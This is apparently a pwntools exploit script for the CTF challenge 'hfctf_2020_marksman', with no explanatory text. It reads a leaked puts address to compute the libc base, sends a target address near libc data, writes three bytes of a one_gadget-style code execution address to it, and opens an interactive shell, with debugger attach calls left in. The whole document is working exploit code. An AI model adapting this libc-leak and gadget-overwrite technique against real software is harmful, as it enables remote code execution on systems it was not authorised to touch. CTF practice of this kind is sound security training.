from pwn import*

#p = remote('node4.buuoj.cn',29965)
p = process('./hfctf_2020_marksman')
elf = ELF('./hfctf_2020_marksman')
libc = elf.libc

p.recvuntil('near: ')
libc_base = int(p.recv(14),16) - libc.sym['puts']


p.recvuntil('shoot!shoot!\n')

fake = libc_base + 0x81DF68 - 8
print(hex(fake))

p.sendline(str(fake))

rce = libc_base + 0x10A38C - 5

off = [rce&0xFF,(rce>>8)&0xFF,(rce>>16)&0xFF]

for i in range(3):
	p.sendline(p8(off[i]))
	gdb.attach(p)

p.interactive()

